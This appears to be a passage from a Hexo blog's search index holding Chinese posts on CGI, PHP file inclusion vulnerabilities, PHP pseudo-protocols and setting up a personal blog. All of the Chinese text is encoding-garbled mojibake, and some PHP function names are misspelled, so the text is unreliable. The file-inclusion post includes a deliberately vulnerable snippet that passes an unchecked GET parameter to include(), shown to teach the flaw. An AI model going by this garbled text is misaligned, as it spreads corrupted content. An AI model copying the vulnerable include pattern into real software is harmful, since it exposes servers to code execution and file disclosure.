‡å‡†è¾“å‡ºæµå°†è¯¥ç»“æœæ•°æ®ä¼ é€’ç»™æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹ã€‚</p><h4 id="2ï¼ç¼“å†²CGI"><a href="#2ï¼ç¼“å†²CGI" class="headerlink" title="2ï¼ç¼“å†²CGI"></a>2ï¼ç¼“å†²CGI</h4><p>æ ‡å‡†CGIä½¿ç”¨Stdinï¼Stdoutæ¥è¿›è¡Œæ•°æ®é€šè®¯ï¼Œè¿™æ˜¯ç”±å…¶æœ€åˆå¼€å‘ç¯å¢ƒï¼ˆUnixæ“ä½œç³»ç»Ÿï¼‰æ‰€å†³å®šçš„ã€‚ä½†æ˜¯è®¸å¤šWindowsç¯å¢ƒä¸‹çš„ç¼–ç¨‹å·¥å…·ï¼ˆå¦‚VBå’ŒDelphiç­‰ï¼‰æ˜¯ä¸æ”¯æŒè¿™ç§Iï¼Oæ–¹å¼çš„ï¼Œè¿™æ—¶å°±ä¸èƒ½ç”¨å®ƒä»¬æ¥å¼€å‘åŸºäºæ ‡å‡†CGIçš„åº”ç”¨ç¨‹åºã€‚äºæ˜¯æœ‰äº›æœåŠ¡å™¨æå‡ºäº†ç¼“å†²CGIçš„æ¦‚å¿µã€‚ç¼“å†²CGIäº¦ç§°ä¸ºWinCGIã€‚æ­¤æ—¶CGIæ‰©å±•ç¨‹åºä¸æœåŠ¡å™¨é—´é€šè¿‡ç¼“å†²CGIè€Œä¸æ˜¯æ ‡å‡†CGIè¿›è¡Œé€šè®¯ï¼Œè€Œç¼“å†²CGIä¸æœåŠ¡å™¨é—´çš„é€šè®¯è¿˜æ˜¯é€šè¿‡æ ‡å‡†CGIæ¥å£ã€‚åè€…ç”±WWWæœåŠ¡å™¨çš„å†…ç½®ç¼“å†²å¤„ç†ç¨‹åºå®ç°ã€‚è¿™å‡ éƒ¨åˆ†çš„å…³ç³»å¯ç”¨å›¾1ï¼2è¡¨ç¤ºï¼ˆç¼–æ’è€…ï¼šå›¾ç•¥ï¼‰ï¼šç¼“å†²CGIçš„å·¥ä½œåŸç†ä¸æ ‡å‡†CGIç›¸ä¼¼ï¼Œä¸åŒçš„æ˜¯å½“æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„CGIè¯·æ±‚æ—¶ï¼Œæ‰€å»ºç«‹çš„CGIå­è¿›ç¨‹å°†CGIè¯·æ±‚çš„æœ‰å…³æ•°æ®è®¾ç½®æˆç¯å¢ƒå˜é‡å¤–ï¼Œè¿˜å°†å®ƒä»¬ä¿å­˜åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ï¼›é€šè¿‡ç¼“å†²å¤„ç†ç¨‹åºåœ¨å¤–éƒ¨CGIç¨‹åºä¸æœåŠ¡å™¨é—´å»ºç«‹ä¸¤æ¡æ•°æ®é€šé“ï¼ˆè¾“å…¥ï¼è¾“å‡ºç¼“å†²åŒºï¼‰ã€‚CGIå­è¿›ç¨‹é€šè¿‡è¾“å‡ºç¼“å†²åŒºå°†å¤„ç†ç»“æœä¼ é€’ç»™æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹ã€‚æ­¤å¤„å¤–éƒ¨CGIç¨‹åºé€šè¿‡ç¯å¢ƒå˜é‡å’Œè¾“å…¥ï¼è¾“å‡ºç¼“å†²åŒºä¸WWWæœåŠ¡å™¨è¿›è¡Œé€šè®¯ï¼Œä¼ é€’æœ‰å…³å‚æ•°å’Œå¤„ç†ç»“æœã€‚æ­¤å¤„ç¯å¢ƒå˜é‡çš„æ„ä¹‰åŒä¸Šï¼Œä¸è¿‡è¿™äº›ç¯å¢ƒå˜é‡åŠå…¶ç›¸åº”å€¼ä¿å­˜åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚æ­¤å¤–ï¼Œè¾“å…¥ç¼“å†²åŒºä¸­è¿˜å­˜æ”¾å®¢æˆ·ç«¯çš„ä¼ è¾“æ•°æ®ï¼ˆå¦‚é‡‡ç”¨POSTæ¨¡å¼çš„è¯ï¼‰ã€‚è¾“å‡ºç¼“å†²åŒºç”¨æ¥å­˜æ”¾æ‰©å±•ç¨‹åºçš„å¤„ç†ç»“æœã€‚</p><h4 id="3ï¼æ ‡å‡†CGIä¸ç¼“å†²CGIçš„åŒºåˆ«"><a href="#3ï¼æ ‡å‡†CGIä¸ç¼“å†²CGIçš„åŒºåˆ«" class="headerlink" title="3ï¼æ ‡å‡†CGIä¸ç¼“å†²CGIçš„åŒºåˆ«"></a>3ï¼æ ‡å‡†CGIä¸ç¼“å†²CGIçš„åŒºåˆ«</h4><p>å¯¹CGIæ‰©å±•ç¨‹åºè€Œè¨€ï¼Œæœ€ä¸»è¦å·®åˆ«åœ¨äºæ•°æ®çš„Iï¼Oä¸åŒï¼šå¯¹ç¼“å†²CGIï¼ŒæœåŠ¡å™¨ä¸CGIæ‰©å±•ç¨‹åºé—´çš„æ•°æ®äº¤æ¢æ˜¯é€šè¿‡ç¼“å†²åŒºï¼›è€Œæ ‡å‡†CGIæ˜¯é€šè¿‡æ ‡å‡†Iï¼Oã€‚ä½¿ç”¨ç¼“å†²CGIå¯é€‰æ‹©æ›´å¤šçš„å¼€å‘å·¥å…·ï¼Œå¯ä»¥å¼€å‘Windows95å’ŒWindowsNTä¸‹çš„GUIæ‰©å±•ç¨‹åºï¼›è€Œä½¿ç”¨æ ‡å‡†CGIæ‰€é€‰ç”¨çš„å¼€å‘å·¥å…·å¿…é¡»æ”¯æŒæ ‡å‡†Iï¼Oã€‚åªæœ‰å°‘æ•°å‡ ç§WWWæœåŠ¡å™¨æ”¯æŒç¼“å†²CGIï¼Œå› æ­¤åŸºäºå®ƒçš„æ‰©å±•ç¨‹åºå…¼å®¹æ€§ä¸å¦‚æ ‡å‡†CGIå¥½ã€‚</p><h3 id="1ï¼3-CGIä¸å…¶ä»–WWWæŠ€æœ¯çš„å…³ç³»"><a href="#1ï¼3-CGIä¸å…¶ä»–WWWæŠ€æœ¯çš„å…³ç³»" class="headerlink" title="1ï¼3 CGIä¸å…¶ä»–WWWæŠ€æœ¯çš„å…³ç³»"></a>1ï¼3 CGIä¸å…¶ä»–WWWæŠ€æœ¯çš„å…³ç³»</h3><p>CGIä½œä¸ºWWWæœåŠ¡å™¨çš„æ ‡å‡†æ‰©å±•æŠ€æœ¯ï¼Œç”±ä¸Šé¢CGIçš„åŸºæœ¬åŸç†å¯çŸ¥ï¼Œå®ƒå’Œè®¸å¤šå…¶å®ƒçš„WWWæŠ€æœ¯å¯†åˆ‡ç›¸å…³ï¼Œå¦‚HTTPã€HTMLã€MIMEå’ŒURLç­‰ï¼Œä¸‹é¢ä¸»è¦å°±å®ƒä¸å‰ä¸¤ç§æŠ€æœ¯çš„å…³ç³»è¿›è¡Œç ”ç©¶ã€‚</p><h4 id="1ï¼CGIä¸HTTPåè®®"><a href="#1ï¼CGIä¸HTTPåè®®" class="headerlink" title="1ï¼CGIä¸HTTPåè®®"></a>1ï¼CGIä¸HTTPåè®®</h4><p>CGIé€šè¿‡HTTPåè®®åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¿›è¡Œé€šè®¯ï¼šï¼Šå®¢æˆ·ç«¯ç”¨æˆ·ä»£ç†å‘æœåŠ¡å™¨å‘é€çš„è¯·æ±‚æ˜¯HTTPè¯·æ±‚æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸­å«æœ‰å¤„ç†ç”¨æˆ·è¾“å…¥çš„CGIæ‰©å±•ç¨‹åºçš„URLå€¼ã€‚ï¼ŠCGIæ‰©å±•ç¨‹åºåœ¨å¤„ç†ç»“æŸåï¼Œè¿”å›ç»™å®¢æˆ·ç«¯çš„åº”ç­”æ˜¯HTTPåº”ç­”æ¶ˆæ¯ã€‚å› æ­¤CGIç¨‹åºçš„è¾“å‡ºæ•°æ®å¿…é¡»ç¬¦åˆHTTPåº”ç­”æ¶ˆæ¯çš„è¯­æ³•æ ¼å¼ï¼Œè¿™åœ¨åŸºäºCGIæ ‡å‡†çš„å¼€å‘ä¸­éå¸¸é‡è¦ã€‚</p><h4 id="2ï¼CGIä¸HTMLè¯­è¨€"><a href="#2ï¼CGIä¸HTMLè¯­è¨€" class="headerlink" title="2ï¼CGIä¸HTMLè¯­è¨€"></a>2ï¼CGIä¸HTMLè¯­è¨€</h4><p>CGIæ‰©å±•ç¨‹åºçš„è¾“å‡ºæ•°æ®ï¼ˆHTTPåº”ç­”æ¶ˆæ¯ï¼‰ä¸€èˆ¬æœ‰ä¸¤ç§ï¼šç¬¦åˆMIMEç±»å‹çš„æ–‡æ¡£ï¼ˆæœ€æ™®éçš„æ˜¯HTMLæ–‡æ¡£ï¼Œè¡¨ç¤ºä¸ºtext/htmlï¼‰ï¼›æŒ‡å‘å…¶å®ƒæ–‡æ¡£çš„URLé“¾æ¥ã€‚è¿™ä¸¤ç§æ–¹å¼éƒ½ä¸HTMLè¯­è¨€æœ‰å…³ï¼Œæ•°æ®çš„ç»„ç»‡é¡»ç¬¦åˆHTMLè¯­æ³•æ ¼å¼ã€‚</p><h3 id="æ¥è‡ª-https-www-cnblogs-com-lidabo-p-5756248-html"><a href="#æ¥è‡ª-https-www-cnblogs-com-lidabo-p-5756248-html" class="headerlink" title="æ¥è‡ª https://www.cnblogs.com/lidabo/p/5756248.html"></a>æ¥è‡ª <a href="https://www.cnblogs.com/lidabo/p/5756248.html" target="_blank" rel="noopener">https://www.cnblogs.com/lidabo/p/5756248.html</a></h3>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> CGIæŠ€æœ¯åŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«1</title>
      <link href="/posts/6b68.html"/>
      <url>/posts/6b68.html</url>
      
        <content type="html"><![CDATA[<h3 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h3><p>äº§ç”Ÿçš„åŸå› :ä¸»è¦åŸå› æ˜¯åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œè°ƒç”¨(åŒ…å«)å…¶ä»–æ–‡ä»¶,è®©å…¶ä»–æ–‡ä»¶æŒ‰ç…§phpä»£ç æ‰§è¡Œï¼Œè¿™å°±äº§ç”Ÿäº†æ¼æ´ï¼Œå¦‚æœè°ƒç”¨çš„æ—¶å€™æ²¡ç”¨ç»è¿‡è¿‡æ»¤æˆ–è€…ä¸¥æ ¼çš„å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ‰€æ§åˆ¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡åŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œæ¥æ¶æ„çš„æ‰§è¡Œphpä»£ç ã€‚<br>ç¤ºä¾‹ä»£ç :<br><?php    $filename=$_GET['filename'];    include($filename);?><br>ä¾‹å¦‚:$_GET[â€˜filenameâ€™]æ²¡æœ‰ç»è¿‡æ»¤ç›´æ¥ä»£å…¥äº†includeä¸­ï¼Œè¿™å°±å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹$_GET[â€˜filenameâ€™]çš„å€¼ï¼Œæ¶å¿ƒæ‰§è¡Œphpä»£ç ï¼Œäº§ç”Ÿéé¢„æœŸçš„æ•ˆæœã€‚<br>phpä¸­æ–‡ä»¶åŒ…å«çš„å››ç§å‡½æ•°:<br>require()         å‡½æ•°è°ƒç”¨æ—¶å‡ºç°é”™è¯¯ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åº<br>require_one() ä¸require()å‡½æ•°ä¸€æ ·ï¼Œä½†ç›¸åŒçš„æ–‡ä»¶åªèƒ½è°ƒç”¨æ‰§è¡Œä¸€æ¬¡<br>include()          å‡½æ•°åŒ…å«å‡ºç°é”™è¯¯æ—¶ä¼šæŠ¥é”™ï¼Œä½†ä¼šç»§ç»­æ‰§è¡Œåé¢çš„ä»£ç <br>include_one()  ä¸include()å‡½æ•°ä¸€æ ·ï¼Œä½†ç›¸åŒçš„æ–‡ä»¶åªèƒ½è°ƒç”¨æ‰§è¡Œä¸€æ¬¡<br><img src="https://Lmg66.github.io/img/2.png" alt="å›¾ç‰‡"></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«2</title>
      <link href="/posts/e8ab.html"/>
      <url>/posts/e8ab.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€ï¼šè‡ªä»åšå®¢å¼„å¥½åå°±ä¼‘æ¯äº†ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥æ²¡å­¦å•¥å°±åˆ†äº«ä¸€ä¸‹ä¹‹å‰å­¦çš„æ–‡ä»¶åŒ…å«ä¸­çš„phpä¼ªåè®®ï¼Œå› ä¸ºæ‡’å¾—åœ¨æ‰“ä¸€éå°±ç›´æ¥æŠŠOneNoteä¸­çš„ç¬”è®°ç”¨å›¾ç‰‡åˆ†äº«ï¼Œè€Œå›¾ç‰‡æ²¡æœ‰åšåŠ é€Ÿå¯èƒ½åŠ è½½ä¼šæ¯”è¾ƒæ…¢è¿˜æœ›è°…è§£ã€‚"><a href="#å‰è¨€ï¼šè‡ªä»åšå®¢å¼„å¥½åå°±ä¼‘æ¯äº†ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥æ²¡å­¦å•¥å°±åˆ†äº«ä¸€ä¸‹ä¹‹å‰å­¦çš„æ–‡ä»¶åŒ…å«ä¸­çš„phpä¼ªåè®®ï¼Œå› ä¸ºæ‡’å¾—åœ¨æ‰“ä¸€éå°±ç›´æ¥æŠŠOneNoteä¸­çš„ç¬”è®°ç”¨å›¾ç‰‡åˆ†äº«ï¼Œè€Œå›¾ç‰‡æ²¡æœ‰åšåŠ é€Ÿå¯èƒ½åŠ è½½ä¼šæ¯”è¾ƒæ…¢è¿˜æœ›è°…è§£ã€‚" class="headerlink" title="å‰è¨€ï¼šè‡ªä»åšå®¢å¼„å¥½åå°±ä¼‘æ¯äº†ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥æ²¡å­¦å•¥å°±åˆ†äº«ä¸€ä¸‹ä¹‹å‰å­¦çš„æ–‡ä»¶åŒ…å«ä¸­çš„phpä¼ªåè®®ï¼Œå› ä¸ºæ‡’å¾—åœ¨æ‰“ä¸€éå°±ç›´æ¥æŠŠOneNoteä¸­çš„ç¬”è®°ç”¨å›¾ç‰‡åˆ†äº«ï¼Œè€Œå›¾ç‰‡æ²¡æœ‰åšåŠ é€Ÿå¯èƒ½åŠ è½½ä¼šæ¯”è¾ƒæ…¢è¿˜æœ›è°…è§£ã€‚"></a>å‰è¨€ï¼šè‡ªä»åšå®¢å¼„å¥½åå°±ä¼‘æ¯äº†ä¸€æ®µæ—¶é—´ï¼Œæ‰€ä»¥æ²¡å­¦å•¥å°±åˆ†äº«ä¸€ä¸‹ä¹‹å‰å­¦çš„æ–‡ä»¶åŒ…å«ä¸­çš„phpä¼ªåè®®ï¼Œå› ä¸ºæ‡’å¾—åœ¨æ‰“ä¸€éå°±ç›´æ¥æŠŠOneNoteä¸­çš„ç¬”è®°ç”¨å›¾ç‰‡åˆ†äº«ï¼Œè€Œå›¾ç‰‡æ²¡æœ‰åšåŠ é€Ÿå¯èƒ½åŠ è½½ä¼šæ¯”è¾ƒæ…¢è¿˜æœ›è°…è§£ã€‚</h3><h3 id="æ­£æ–‡ï¼šphpä¼ªåè®®çš„ç›®çš„-ä¸ªäººç†è§£-ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œè·å¾—æºç ï¼Œå†™å…¥æœ¨é©¬"><a href="#æ­£æ–‡ï¼šphpä¼ªåè®®çš„ç›®çš„-ä¸ªäººç†è§£-ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œè·å¾—æºç ï¼Œå†™å…¥æœ¨é©¬" class="headerlink" title="æ­£æ–‡ï¼šphpä¼ªåè®®çš„ç›®çš„(ä¸ªäººç†è§£):ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œè·å¾—æºç ï¼Œå†™å…¥æœ¨é©¬"></a>æ­£æ–‡ï¼šphpä¼ªåè®®çš„ç›®çš„(ä¸ªäººç†è§£):ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œè·å¾—æºç ï¼Œå†™å…¥æœ¨é©¬</h3><p><img src="https://Lmg66.github.io/img/1.png" alt="å›¾ç‰‡"></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> phpä¼ªåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸¤ç§æ­å»ºä¸ªäººåšå®¢æ–¹æ³•</title>
      <link href="/posts/2f31.html"/>
      <url>/posts/2f31.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€-æ•´äº†ä¸€ä¸ªé˜¿é‡Œäº‘çš„æœåŠ¡å™¨-ä¸è¿‡æ²¡ç”¨ä¸Š-ï¼Œæƒ³ç€æ­ä¸€ä¸ªåšå®¢ï¼Œè®°å½•è‡ªå·±èœé¸¡çš„æ—¥å¸¸ï¼Œä¸­é—´èµ°äº†å¾ˆå¤šå¼¯è·¯ï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„ä¸¤ç§æ­å»ºåšå®¢çš„å¿«æ·æ–¹æ³•ï¼Œå¸Œæœ›èƒ½å¸®åˆ°ä½ "><a href="#å‰è¨€-æ•´äº†ä¸€ä¸ªé˜¿é‡Œäº‘çš„æœåŠ¡å™¨-ä¸è¿‡æ²¡ç”¨ä¸Š-ï¼Œæƒ³ç€æ­ä¸€ä¸ªåšå®¢ï¼Œè®°å½•è‡ªå·±èœé¸¡çš„æ—¥å¸¸ï¼Œä¸­é—´èµ°äº†å¾ˆå¤šå¼¯è·¯ï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„ä¸¤ç§æ­å»ºåšå®¢çš„å¿«æ·æ–¹æ³•ï¼Œå¸Œæœ›èƒ½å¸®åˆ°ä½ " class="headerlink" title="å‰è¨€:æ•´äº†ä¸€ä¸ªé˜¿é‡Œäº‘çš„æœåŠ¡å™¨(ä¸è¿‡æ²¡ç”¨ä¸Š)ï¼Œæƒ³ç€æ­ä¸€ä¸ªåšå®¢ï¼Œè®°å½•è‡ªå·±èœé¸¡çš„æ—¥å¸¸ï¼Œä¸­é—´èµ°äº†å¾ˆå¤šå¼¯è·¯ï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„ä¸¤ç§æ­å»ºåšå®¢çš„å¿«æ·æ–¹æ³•ï¼Œå¸Œæœ›èƒ½å¸®åˆ°ä½ "></a>å‰è¨€:æ•´äº†ä¸€ä¸ªé˜¿é‡Œäº‘çš„æœåŠ¡å™¨(ä¸è¿‡æ²¡ç”¨ä¸Š)ï¼Œæƒ³ç€æ­ä¸€ä¸ªåšå®¢ï¼Œè®°å½•è‡ªå·±èœé¸¡çš„æ—¥å¸¸ï¼Œä¸­é—´èµ°äº†å¾ˆå¤šå¼¯è·¯ï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„ä¸¤ç§æ­å»ºåšå®¢çš„å¿«æ·æ–¹æ³•ï¼Œå¸Œæœ›èƒ½å¸®åˆ°ä½ </h3><h1 id="æ–¹æ³•ä¸€-ä¸ªäººæœåŠ¡å™¨-å®å¡”-wordpress"><a href="#æ–¹æ³•ä¸€-ä¸ªäººæœåŠ¡å™¨-å®å¡”-wordpress" class="headerlink" title="æ–¹æ³•ä¸€:ä¸ªäººæœåŠ¡å™¨+å®å¡”+wordpress"></a>æ–¹æ³•ä¸€:ä¸ªäººæœåŠ¡å™¨+å®å¡”+wordpress</h1><hr><h2 id="æ–¹æ³•ä¸€-ä¼˜åŠ¿"><a href="#æ–¹æ³•ä¸€-ä¼˜åŠ¿" class="headerlink" title="æ–¹æ³•ä¸€:ä¼˜åŠ¿"></a>æ–¹æ³•ä¸€:ä¼˜åŠ¿</h2><ol><li>å¯æ‹“å±•æ€§å¼ºï¼Œå¯ä»¥æ·»åŠ è®ºå›ï¼Œä¸ªäººæ¸¸æˆç­‰ç­‰çš„ä¸ªäººé¡¹ç›®</li><li>æ“ä½œç®€å•ï¼Œwordpressåå°æ˜¯å›¾å½¢åŒ–é¡µé¢</li><li>å›½å†…è®¿é—®é€Ÿåº¦è¾ƒå¿«</li></ol><h2 id="æ–¹æ³•ä¸€-åŠ£åŠ¿"><a href="#æ–¹æ³•ä¸€-åŠ£åŠ¿" class="headerlink" title="æ–¹æ³•ä¸€:åŠ£åŠ¿"></a>æ–¹æ³•ä¸€:åŠ£åŠ¿</h2><ol><li>åŸŸåéœ€è¦å®åï¼ŒæœåŠ¡å™¨éœ€è¦å¤‡æ¡ˆ(å¤§é™†)ï¼Œå¤§æ¦‚éœ€è¦å°åŠä¸ªæœˆ</li><li>éœ€è¦è´¹ç”¨ï¼Œå¤§æ¦‚200å…ƒ/å¹´(å­¦ç”Ÿä¼˜æƒ )</li><li>å¯èƒ½æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œéœ€è¦æ‰“è¡¥ä¸å’ŒåæœŸç»´æŠ¤</li></ol><h3 id="å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èä¸€ä¸ªæˆ‘æ‰¾äº†å¾ˆä¹…çš„å¾ˆå¥½çš„è§†é¢‘bç«™å°æ¸¸-ä»–çš„ä¸»é¢˜ä¹Ÿå¾ˆå¥½çœ‹å¯ä»¥ä½¿ç”¨ï¼Œçœ‹ä»–çš„è§†é¢‘å®Œå…¨å¤Ÿç”¨äº†"><a href="#å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èä¸€ä¸ªæˆ‘æ‰¾äº†å¾ˆä¹…çš„å¾ˆå¥½çš„è§†é¢‘bç«™å°æ¸¸-ä»–çš„ä¸»é¢˜ä¹Ÿå¾ˆå¥½çœ‹å¯ä»¥ä½¿ç”¨ï¼Œçœ‹ä»–çš„è§†é¢‘å®Œå…¨å¤Ÿç”¨äº†" class="headerlink" title="å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èä¸€ä¸ªæˆ‘æ‰¾äº†å¾ˆä¹…çš„å¾ˆå¥½çš„è§†é¢‘bç«™å°æ¸¸,ä»–çš„ä¸»é¢˜ä¹Ÿå¾ˆå¥½çœ‹å¯ä»¥ä½¿ç”¨ï¼Œçœ‹ä»–çš„è§†é¢‘å®Œå…¨å¤Ÿç”¨äº†"></a>å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èä¸€ä¸ªæˆ‘æ‰¾äº†å¾ˆä¹…çš„å¾ˆå¥½çš„è§†é¢‘<a href="https://www.bilibili.com/video/BV1j4411C7Qf" target="_blank" rel="noopener">bç«™å°æ¸¸</a>,ä»–çš„ä¸»é¢˜ä¹Ÿå¾ˆå¥½çœ‹å¯ä»¥ä½¿ç”¨ï¼Œçœ‹ä»–çš„è§†é¢‘å®Œå…¨å¤Ÿç”¨äº†</h3><hr><h1 id="æ–¹æ³•äºŒ-åŸºäºgithub-ç äº‘-codingæ­å»º-hexo"><a href="#æ–¹æ³•äºŒ-åŸºäºgithub-ç äº‘-codingæ­å»º-hexo" class="headerlink" title="æ–¹æ³•äºŒ:åŸºäºgithub/ç äº‘/codingæ­å»º+hexo"></a>æ–¹æ³•äºŒ:åŸºäºgithub/ç äº‘/codingæ­å»º+hexo</h1><hr><h2 id="æ–¹æ³•äºŒ-ä¼˜åŠ¿"><a href="#æ–¹æ³•äºŒ-ä¼˜åŠ¿" class="headerlink" title="æ–¹æ³•äºŒ:ä¼˜åŠ¿"></a>æ–¹æ³•äºŒ:ä¼˜åŠ¿</h2><ol><li>å…è´¹ä¸ç”¨åŸŸåä¹Ÿä¸ç”¨æœåŠ¡å™¨ï¼Œå¦‚æœä½ æƒ³è‡ªå®šä¹‰åŸŸåä¹Ÿå¯ä»¥ç»‘å®š</li><li>ä¸ç”¨æ‹…å¿ƒç½‘ç«™è¢«æ”»å‡»ï¼Œå› ä¸ºæ˜¯æ˜¯çº¯é™æ€é¡µé¢</li></ol><h2 id="æ–¹æ³•äºŒ-åŠ£åŠ¿"><a href="#æ–¹æ³•äºŒ-åŠ£åŠ¿" class="headerlink" title="æ–¹æ³•äºŒ:åŠ£åŠ¿"></a>æ–¹æ³•äºŒ:åŠ£åŠ¿</h2><ol><li>å¯æ‹“å±•æ€§å·®ï¼Œå› ä¸ºæ²¡æ³•æ•°æ®äº¤äº’ï¼Œä¸è¿‡å¦‚æœåªæ˜¯æ•´åšå®¢å®Œå…¨å¤Ÿç”¨</li><li>è®¿é—®é€Ÿåº¦å¯èƒ½ä¼šæ…¢äº›ï¼Œgithubä½ æ‡‚çš„ï¼Œæ¨èä½¿ç”¨å›½å†…ç±»ä¼¼githubçš„ç äº‘æ¥æ­å»ºï¼Œè®¿é—®é€Ÿåº¦è¿˜æ˜¯å¯ä»¥çš„</li><li>éœ€è¦å­¦ä¹ çš„è¦å¤šä¸€äº›(ä¸€äº›åŸºç¡€çš„gitï¼ŒMarkdown ï¼Œcssï¼Œjsï¼Œhtml)ï¼Œæ²¡æœ‰å›¾å½¢åŒ–é¡µé¢éœ€è¦é¢å¯¹æºç è¿›è¡Œç¾åŒ–å’Œå‘å¸ƒæ–‡ç« </li></ol><h3 id="å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èæˆ‘çœ‹çš„æ•™ç¨‹åšå®¢å¾ˆä¸é”™è¿‡å®¢-æˆ‘çš„githubä¹Ÿæœ‰æˆ‘åšå®¢çš„æºç ï¼Œå…¶ä»–çš„éœ€è¦å•¥è‡ªè¡Œç™¾åº¦"><a href="#å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èæˆ‘çœ‹çš„æ•™ç¨‹åšå®¢å¾ˆä¸é”™è¿‡å®¢-æˆ‘çš„githubä¹Ÿæœ‰æˆ‘åšå®¢çš„æºç ï¼Œå…¶ä»–çš„éœ€è¦å•¥è‡ªè¡Œç™¾åº¦" class="headerlink" title="å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èæˆ‘çœ‹çš„æ•™ç¨‹åšå®¢å¾ˆä¸é”™è¿‡å®¢,æˆ‘çš„githubä¹Ÿæœ‰æˆ‘åšå®¢çš„æºç ï¼Œå…¶ä»–çš„éœ€è¦å•¥è‡ªè¡Œç™¾åº¦"></a>å¦‚æœæƒ³ç”¨è¿™ç§æ–¹æ³•æ­å»ºä¸ªäººåšå®¢ï¼Œæ¨èæˆ‘çœ‹çš„æ•™ç¨‹åšå®¢å¾ˆä¸é”™<a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">è¿‡å®¢</a>,æˆ‘çš„githubä¹Ÿæœ‰æˆ‘åšå®¢çš„æºç ï¼Œå…¶ä»–çš„éœ€è¦å•¥è‡ªè¡Œç™¾åº¦</h3><hr><h3 id="å¥½çš„å°±è¿™äº›ï¼Œå› ä¸ºè¿˜æ²¡å¼„å›¾åºŠæ²¡æ³•å‘å›¾ç‰‡éƒ½è¿™æ ·å§ï¼Œå…·ä½“é—®é¢˜å¯ä»¥ç•™è¨€ï¼Œè¯„è®ºï¼Œç§èŠæˆ‘qq"><a href="#å¥½çš„å°±è¿™äº›ï¼Œå› ä¸ºè¿˜æ²¡å¼„å›¾åºŠæ²¡æ³•å‘å›¾ç‰‡éƒ½è¿™æ ·å§ï¼Œå…·ä½“é—®é¢˜å¯ä»¥ç•™è¨€ï¼Œè¯„è®ºï¼Œç§èŠæˆ‘qq" class="headerlink" title="å¥½çš„å°±è¿™äº›ï¼Œå› ä¸ºè¿˜æ²¡å¼„å›¾åºŠæ²¡æ³•å‘å›¾ç‰‡éƒ½è¿™æ ·å§ï¼Œå…·ä½“é—®é¢˜å¯ä»¥ç•™è¨€ï¼Œè¯„è®ºï¼Œç§èŠæˆ‘qq"></a>å¥½çš„å°±è¿™äº›ï¼Œå› ä¸ºè¿˜æ²¡å¼„å›¾åºŠæ²¡æ³•å‘å›¾ç‰‡éƒ½è¿™æ ·å§ï¼Œå…·ä½“é—®é¢˜å¯ä»¥ç•™è¨€ï¼Œè¯„è®ºï¼Œç§èŠæˆ‘qq</h3>]]></content>
      
      
      <categories>
          
          <category> åšå®¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸ªäººåšå®¢çš„æ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
